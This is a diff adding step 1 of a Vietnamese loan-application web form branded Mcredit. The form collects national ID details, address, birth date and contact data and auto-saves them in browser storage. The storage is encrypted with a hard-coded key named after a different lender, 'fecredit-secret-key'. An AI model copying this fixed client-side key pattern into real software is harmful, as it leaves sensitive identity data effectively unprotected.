@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes, viewport-fit=cover">
+    <script src="../js/desktop-scale.js"></script>
+    <title>Mcredit - Bước 1: Thông tin cá nhân</title>
+    <meta name="description" content="Đăng ký vay Mcredit — nhập thông tin cá nhân theo CCCD/CMND. Bước đầu tiên để hoàn tất hồ sơ vay nhanh chóng và an toàn.">
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="step1.css">
+    <link rel="stylesheet" href="mobile-accessibility.css">
+
+    <style>
+        #site-header {
+            background: #fff;
+            box-shadow: 0 2px 16px rgba(20, 30, 210, 0.08);
+            padding: 12px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        #site-header .header-inner {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        #site-header .brand-tagline {
+            font-size: 12px;
+            color: var(--mcredit-primary);
+            font-weight: 600;
+            margin: 0;
+        }
+        .nav__link {
+            text-decoration: none;
+            color: var(--mcredit-primary-dark);
+            font-weight: 600;
+            padding: 0 12px;
+            font-size: 14px;
+        }
+        .nav__link:hover { color: var(--mcredit-primary); }
+
+        .hero-compact {
+            max-width: 900px;
+            margin: 0 auto var(--mcredit-space-5);
+            padding: 0 16px;
+        }
+        .hero-compact-inner {
+            position: relative;
+            border-radius: var(--mcredit-radius-xl);
+            overflow: hidden;
+            box-shadow: 0 8px 32px rgba(20, 30, 210, 0.15);
+            min-height: 160px;
+        }
+        .hero-compact-inner img {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            display: block;
+        }
+        .hero-compact-overlay {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(90deg, rgba(10, 16, 128, 0.92) 0%, rgba(20, 30, 210, 0.55) 55%, transparent 100%);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 24px 28px;
+            color: #fff;
+        }
+        .hero-compact-overlay .tagline {
+            color: #66d4fc;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+        .hero-compact-overlay h1 {
+            font-size: clamp(1.15rem, 3vw, 1.45rem);
+            font-weight: 700;
+            margin: 0 0 6px;
+            line-height: 1.3;
+        }
+        .hero-compact-overlay p {
+            margin: 0;
+            font-size: 0.9rem;
+            opacity: 0.95;
+            max-width: 480px;
+        }
+
+        .steps-wrap {
+            max-width: 900px;
+            margin: 0 auto var(--mcredit-space-4);
+            padding: 0 16px;
+        }
+
+        .draft-restored-note {
+            background: var(--mcredit-bg-light);
+            border: 1px solid rgba(0, 180, 250, 0.35);
+            color: var(--mcredit-primary-dark);
+            border-radius: var(--mcredit-radius-md);
+            padding: 10px 14px;
+            font-size: 13px;
+            margin-bottom: var(--mcredit-space-4);
+            display: none;
+        }
+
+        #errorSummaryAlert {
+            max-width: 900px;
+            margin: 0 auto var(--mcredit-space-4);
+            border-radius: var(--mcredit-radius-md);
+            border: none;
+            background: rgba(229, 62, 62, 0.08);
+            color: var(--mcredit-error);
+        }
+
+        .page-footer {
+            text-align: center;
+            padding: 24px 16px 40px;
+            font-size: 13px;
+            color: var(--mcredit-text-secondary);
+        }
+        .page-footer strong { color: var(--mcredit-primary-dark); }
+
+        .form-field.has-icon .form-field-icon {
+            top: calc(1.5em + var(--mcredit-space-2) + var(--mcredit-touch-target) / 2);
+            transform: translateY(-50%);
+        }
+
+        @media (max-width: 767px) {
+            .hero-compact-inner img { height: 140px; }
+            .hero-compact-overlay { padding: 16px 18px; }
+        }
+    </style>
+    <link rel="stylesheet" href="loan-mobile.css">
+</head>
+<body>
+    <div id="site">
+        <header id="site-header">
+            <div class="header-inner">
+                <div>
+                    <a href="../index.html">
+                        <img src="../image/mcredit-logo.png" alt="Mcredit" style="height: 40px; object-fit: contain;">
+                    </a>
+                    <p class="brand-tagline mb-0 mt-1">Khi bạn cần</p>
+                </div>
+                <nav class="d-none d-md-block">
+                    <a class="nav__link" href="../index.html">Trang chủ</a>
+                    <a class="nav__link" href="tel:1900636769">1900 63 67 69</a>
+                </nav>
+            </div>
+        </header>
+
+        <main id="site-content">
+            <div class="hero-compact">
+                <div class="hero-compact-inner">
+                    <img src="../content/mcredit-sao-ke-hero.png" alt="Mcredit - Đăng ký vay">
+                    <div class="hero-compact-overlay">
+                        <span class="tagline">Khi bạn cần</span>
+                        <h1>Đăng ký vay Mcredit</h1>
+                        <p>Điền thông tin cá nhân — bước đầu tiên để hoàn tất hồ sơ vay nhanh chóng &amp; an toàn</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="container px-0">
+                <div id="errorSummaryAlert" class="alert alert-danger" style="display: none;">
+                    <i class="fas fa-exclamation-triangle me-2"></i>
+                    <span id="errorSummaryText">Vui lòng kiểm tra thông tin</span>
+                </div>
+            </div>
+
+            <div class="steps-wrap">
+                <div class="steps" role="progressbar" aria-label="Tiến trình đăng ký">
+                    <div class="step active" aria-current="step">1. THÔNG TIN CÁ NHÂN</div>
+                    <div class="step">2. THÔNG TIN KHOẢN VAY</div>
+                    <div class="step">3. XÁC THỰC</div>
+                </div>
+            </div>
+
+            <div class="step1-container">
+                <form id="registrationForm" onsubmit="return false;" novalidate role="form" aria-label="Biểu mẫu đăng ký vay">
+                    <div id="draftRestoredNote" class="draft-restored-note">
+                        <i class="fas fa-check-circle me-1"></i> Đã tải thông tin đã lưu — bạn có thể chỉnh sửa hoặc tiếp tục.
+                    </div>
+
+                    <div class="form-section">
+                        <div class="form-section-header">
+                            <div class="form-section-icon"><i class="fas fa-user"></i></div>
+                            <div>
+                                <h3 class="form-section-title">THÔNG TIN CÁ NHÂN</h3>
+                                <p class="form-section-subtitle">Nhập chính xác theo CCCD/CMND</p>
+                            </div>
+                        </div>
+
+                        <div class="form-grid">
+                            <div class="form-field has-icon">
+                                <i class="fas fa-user form-field-icon"></i>
+                                <label for="fullName" class="form-label">Họ và tên (Bên vay) *</label>
+                                <input type="text" class="form-control" id="fullName" name="fullName" required placeholder="NGUYEN VAN A" style="text-transform: uppercase;" autocomplete="name">
+                                <div class="invalid-feedback" id="fullNameError">Họ tên không được để trống</div>
+                            </div>
+
+                            <div class="form-field has-icon">
+                                <i class="fas fa-venus-mars form-field-icon"></i>
+                                <label for="gender" class="form-label">Danh xưng *</label>
+                                <select class="form-control form-select" id="gender" name="gender" required>
+                                    <option value="">Chọn danh xưng</option>
+                                    <option value="Ông">Ông</option>
+                                    <option value="Bà">Bà</option>
+                                </select>
+                                <div class="invalid-feedback" id="genderError">Vui lòng chọn danh xưng</div>
+                            </div>
+
+                            <div class="form-field has-icon">
+                                <i class="fas fa-id-card form-field-icon"></i>
+                                <label for="cccd" class="form-label">Số CMND/CCCD *</label>
+                                <input type="text" class="form-control" id="cccd" name="cccd" required maxlength="12" placeholder="Nhập số CMND/CCCD" autocomplete="off">
+                                <div class="invalid-feedback" id="cccdError">CMND/CCCD không hợp lệ</div>
+                            </div>
+
+                            <div class="form-field has-icon">
+                                <i class="fas fa-calendar-alt form-field-icon"></i>
+                                <label for="issueDate" class="form-label">Cấp ngày *</label>
+                                <input type="text" class="form-control" id="issueDate" name="issueDate" required placeholder="dd/mm/yyyy" maxlength="10" autocomplete="off">
+                                <div class="invalid-feedback" id="issueDateError">Ngày cấp không hợp lệ</div>
+                            </div>
+
+                            <div class="form-field has-icon form-grid-full">
+                                <i class="fas fa-building form-field-icon"></i>
+                                <label for="issuePlace" class="form-label">Nơi cấp CMND/CCCD *</label>
+                                <select class="form-control form-select" id="issuePlace" name="issuePlace" required>
+                                    <option value="">Chọn nơi cấp</option>
+                                    <option value="CỤC TRƯỞNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH">CỤC TRƯỞNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH</option>
+                                    <option value="Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư">Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư</option>
+                                </select>
+                                <div class="invalid-feedback" id="issuePlaceError">Vui lòng chọn nơi cấp</div>
+                            </div>
+
+                            <div class="form-field has-icon form-grid-full">
+                                <i class="fas fa-map-marker-alt form-field-icon"></i>
+                                <label for="permanentAddress" class="form-label">Địa chỉ thường trú *</label>
+                                <input type="text" class="form-control" id="permanentAddress" name="permanentAddress" required placeholder="Số nhà, đường, phường/xã, quận/huyện, tỉnh/thành" autocomplete="street-address">
+                                <div class="invalid-feedback" id="permanentAddressError">Vui lòng nhập địa chỉ thường trú</div>
+                            </div>
+
+                            <div class="form-field has-icon">
+                                <i class="fas fa-birthday-cake form-field-icon"></i>
+                                <label for="dob" class="form-label">Ngày sinh *</label>
+                                <input type="text" class="form-control" id="dob" name="dob" required placeholder="dd/mm/yyyy" maxlength="10" autocomplete="bday">
+                                <div class="invalid-feedback" id="dobError">Ngày sinh không hợp lệ</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-section">
+                        <div class="form-section-header">
+                            <div class="form-section-icon"><i class="fas fa-phone"></i></div>
+                            <div>
+                                <h3 class="form-section-title">THÔNG TIN LIÊN HỆ</h3>
+                                <p class="form-section-subtitle">Để nhận thông báo kết quả vay</p>
+                            </div>
+                        </div>
+
+                        <div class="form-grid">
+                            <div class="form-field has-icon">
+                                <i class="fas fa-mobile-alt form-field-icon"></i>
+                                <label for="phone" class="form-label">Điện thoại *</label>
+                                <input type="tel" class="form-control" id="phone" name="phone" required maxlength="10" placeholder="09xxxxxxxx" autocomplete="tel">
+                                <div class="invalid-feedback" id="phoneError">SĐT không hợp lệ</div>
+                            </div>
+
+                            <div class="form-field has-icon">
+                                <i class="fas fa-envelope form-field-icon"></i>
+                                <label for="email" class="form-label">Email</label>
+                                <input type="email" class="form-control" id="email" name="email" placeholder="email@example.com" autocomplete="email">
+                                <div class="invalid-feedback" id="emailError">Email không hợp lệ</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="step-navigation">
+                        <small class="text-muted">
+                            <i class="fas fa-shield-alt me-2" style="color: var(--mcredit-primary);"></i>
+                            Thông tin của bạn được Mcredit bảo mật tuyệt đối
+                        </small>
+                        <button type="button" onclick="goToStep2()" class="btn btn-primary btn-next" id="submitButton">
+                            <span class="btn-text">TIẾP TỤC</span>
+                            <i class="fas fa-arrow-right btn-icon ms-2"></i>
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </main>
+
+        <footer class="page-footer">
+            <strong>Mcredit</strong> — Hotline <a href="tel:1900636769" style="color:var(--mcredit-primary-dark);text-decoration:none">1900 63 67 69</a> · www.mcredit.com.vn
+        </footer>
+    </div>
+
+    <div id="autoSaveIndicator" class="auto-save-indicator">
+        <i class="fas fa-save"></i> Đang lưu...
+    </div>
+
+    <div id="loadingModal" class="loading-modal">
+        <div class="loading-content">
+            <div class="spinner-circle"></div>
+            <h3 id="loadingTitle">Đang xử lý...</h3>
+            <p id="loadingMessage">Đang chuyển sang bước 2</p>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script src="mobile-fixes.js"></script>
+
+    <script>
+        const SECRET_KEY = 'fecredit-secret-key';
+        let saveDraftTimer = null;
+
+        function collectStep1Draft() {
+            return {
+                fullName: $('#fullName').val().trim(),
+                gender: $('#gender').val(),
+                cccd: $('#cccd').val().trim(),
+                issueDate: $('#issueDate').val(),
+                issuePlace: $('#issuePlace').val(),
+                permanentAddress: $('#permanentAddress').val().trim(),
+                contactAddress: $('#permanentAddress').val().trim(),
+                dob: $('#dob').val(),
+                phone: $('#phone').val().replace(/\s/g, ''),
+                email: $('#email').val().trim(),
+                currentStep: 1
+            };
+        }
+
+        function scheduleAutoSave() {
+            clearTimeout(saveDraftTimer);
+            saveDraftTimer = setTimeout(() => {
+                const draft = collectStep1Draft();
+                if (draft.fullName || draft.phone || draft.cccd) {
+                    saveUserData(draft);
+                }
+            }, 700);
+        }
+
+        function hasSavedStep1Data(data) {
+            return Boolean(data && (data.fullName || data.phone || data.cccd));
+        }
+
+        function showAutoSave() {
+            const indicator = $('#autoSaveIndicator');
+            indicator.addClass('show');
+            setTimeout(() => {
+                indicator.addClass('success').html('<i class="fas fa-check"></i> Đã lưu');
+                setTimeout(() => indicator.removeClass('show success').html('<i class="fas fa-save"></i> Đang lưu...'), 2000);
+            }, 500);
+        }
+
+        function saveUserData(data) {
+            try {
+                let existingData = {};
+                const encryptedOld = localStorage.getItem('userData');
+                if (encryptedOld) {
+                    try {
+                        existingData = JSON.parse(CryptoJS.AES.decrypt(encryptedOld, SECRET_KEY).toString(CryptoJS.enc.Utf8));
+                    } catch (e) {}
+                }
+
+                const newData = { ...existingData, ...data, currentStep: 1, timestamp: new Date().toISOString() };
+                const encrypted = CryptoJS.AES.encrypt(JSON.stringify(newData), SECRET_KEY).toString();
+                localStorage.setItem('userData', encrypted);
+                showAutoSave();
+                return true;
+            } catch (error) {
+                console.error('Save error', error);
+                return false;
+            }
+        }
+
+        function loadUserData() {
+            const encrypted = localStorage.getItem('userData');
+            if (!encrypted) return null;
+            try {
+                return JSON.parse(CryptoJS.AES.decrypt(encrypted, SECRET_KEY).toString(CryptoJS.enc.Utf8));
+            } catch (e) {
+                return null;
+            }
+        }
+
+        function validateStep1() {
+            let isValid = true;
+            let firstErrorElement = null;
+            const today = new Date();
+            today.setHours(0, 0, 0, 0);
+
+            const fullName = $('#fullName').val().trim();
+            if (fullName.length < 3) {
+                $('#fullName').addClass('is-invalid');
+                $('#fullNameError').text('Họ và tên phải dài hơn 2 ký tự.');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#fullName')[0];
+            } else {
+                $('#fullName').removeClass('is-invalid');
+            }
+
+            const dob = $('#dob').val();
+            if (!/^\d{2}\/\d{2}\/\d{4}$/.test(dob)) {
+                $('#dob').addClass('is-invalid');
+                $('#dobError').text('Ngày sinh không hợp lệ (dd/mm/yyyy).');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#dob')[0];
+            } else {
+                const [day, month, year] = dob.split('/').map(Number);
+                if (year < 1900 || year > today.getFullYear()) {
+                    $('#dob').addClass('is-invalid');
+                    $('#dobError').text('Năm sinh không hợp lệ.');
+                    isValid = false;
+                    if (!firstErrorElement) firstErrorElement = $('#dob')[0];
+                } else {
+                    const birthDate = new Date(year, month - 1, day);
+                    if (birthDate > today) {
+                        $('#dob').addClass('is-invalid');
+                        $('#dobError').text('Ngày sinh không được ở tương lai.');
+                        isValid = false;
+                        if (!firstErrorElement) firstErrorElement = $('#dob')[0];
+                    } else {
+                        const ageDifMs = today - birthDate.getTime();
+                        const ageDate = new Date(ageDifMs);
+                        const age = Math.abs(ageDate.getUTCFullYear() - 1970);
+
+                        if (age < 18) {
+                            $('#dob').addClass('is-invalid');
+                            $('#dobError').text('Bạn phải đủ 18 tuổi để vay.');
+                            isValid = false;
+                            if (!firstErrorElement) firstErrorElement = $('#dob')[0];
+                        } else if (age > 70) {
+                            $('#dob').addClass('is-invalid');
+                            $('#dobError').text('Độ tuổi vượt quá giới hạn (70 tuổi).');
+                            isValid = false;
+                            if (!firstErrorElement) firstErrorElement = $('#dob')[0];
+                        } else {
+                            $('#dob').removeClass('is-invalid');
+                        }
+                    }
+                }
+            }
+
+            if (!$('#gender').val()) {
+                $('#gender').addClass('is-invalid');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#gender')[0];
+            } else {
+                $('#gender').removeClass('is-invalid');
+            }
+
+            const cccd = $('#cccd').val().replace(/\s/g, '');
+            if (!/^\d{9,12}$/.test(cccd)) {
+                $('#cccd').addClass('is-invalid');
+                $('#cccdError').text('CMND/CCCD phải từ 9-12 số.');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#cccd')[0];
+            } else {
+                $('#cccd').removeClass('is-invalid');
+            }
+
+            const issueDate = $('#issueDate').val();
+            if (!/^\d{2}\/\d{2}\/\d{4}$/.test(issueDate)) {
+                $('#issueDate').addClass('is-invalid');
+                $('#issueDateError').text('Ngày cấp không hợp lệ (dd/mm/yyyy).');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#issueDate')[0];
+            } else {
+                $('#issueDate').removeClass('is-invalid');
+            }
+
+            if ($('#permanentAddress').val().trim().length < 6) {
+                $('#permanentAddress').addClass('is-invalid');
+                $('#permanentAddressError').text('Địa chỉ thường trú phải dài hơn 5 ký tự.');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#permanentAddress')[0];
+            } else {
+                $('#permanentAddress').removeClass('is-invalid');
+            }
+
+            if (!$('#issuePlace').val()) {
+                $('#issuePlace').addClass('is-invalid');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#issuePlace')[0];
+            } else {
+                $('#issuePlace').removeClass('is-invalid');
+            }
+
+            const phone = $('#phone').val().replace(/\s/g, '');
+            if (!/^0[1-9][0-9]{8}$/.test(phone)) {
+                $('#phone').addClass('is-invalid');
+                $('#phoneError').text('Số điện thoại phải là 10 số, bắt đầu bằng 0.');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#phone')[0];
+            } else {
+                $('#phone').removeClass('is-invalid');
+            }
+
+            const email = $('#email').val().trim();
+            if (email && !/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email)) {
+                $('#email').addClass('is-invalid');
+                $('#emailError').text('Email không hợp lệ.');
+                isValid = false;
+                if (!firstErrorElement) firstErrorElement = $('#email')[0];
+            } else {
+                $('#email').removeClass('is-invalid');
+            }
+
+            if (!isValid) {
+                $('#errorSummaryAlert').slideDown();
+                if (firstErrorElement) {
+                    firstErrorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    firstErrorElement.focus();
+                }
+            } else {
+                $('#errorSummaryAlert').slideUp();
+            }
+
+            return isValid;
+        }
+
+        $(document).ready(function () {
+            $('#dob').mask('00/00/0000');
+            $('#issueDate').mask('00/00/0000');
+            $('#cccd').mask('000000000000', {
+                translation: { '0': { pattern: /[0-9]/, optional: true } }
+            });
+            $('#phone').mask('0000000000');
+
+            const savedData = loadUserData();
+            if (savedData) {
+                $('#fullName').val(savedData.fullName || '');
+                $('#gender').val(savedData.gender || '');
+                $('#cccd').val(savedData.cccd || '');
+                $('#issueDate').val(savedData.issueDate || '');
+                $('#issuePlace').val(savedData.issuePlace || '');
+                $('#permanentAddress').val(savedData.permanentAddress || savedData.contactAddress || '');
+                $('#dob').val(savedData.dob || '');
+                $('#phone').val(savedData.phone || '');
+                $('#email').val(savedData.email || '');
+                if (hasSavedStep1Data(savedData)) {
+                    $('#draftRestoredNote').show();
+                }
+            }
+
+            $('#fullName').on('input', function () {
+                this.value = this.value.toUpperCase();
+            });
+
+            $('#registrationForm input, #registrationForm select').on('input change', function () {
+                $(this).removeClass('is-invalid');
+                $('#errorSummaryAlert').slideUp();
+                scheduleAutoSave();
+            });
+        });
+
+        function goToStep2() {
+            if (validateStep1()) {
+                const formData = {
+                    fullName: $('#fullName').val().trim(),
+                    gender: $('#gender').val(),
+                    cccd: $('#cccd').val().trim(),
+                    issueDate: $('#issueDate').val(),
+                    issuePlace: $('#issuePlace').val(),
+                    permanentAddress: $('#permanentAddress').val().trim(),
+                    contactAddress: $('#permanentAddress').val().trim(),
+                    dob: $('#dob').val(),
+                    phone: $('#phone').val().trim().replace(/\s/g, '').replace(/^(\+?84)/, '0'),
+                    email: $('#email').val().trim()
+                };
+
+                saveUserData(formData);
+
+                $('#loadingModal').css('display', 'flex').hide().fadeIn();
+
+                setTimeout(() => {
+                    window.location.href = 'step2.html';
+                }, 1500);
+            }
+        }
+    </script>
+</body>
+</html>
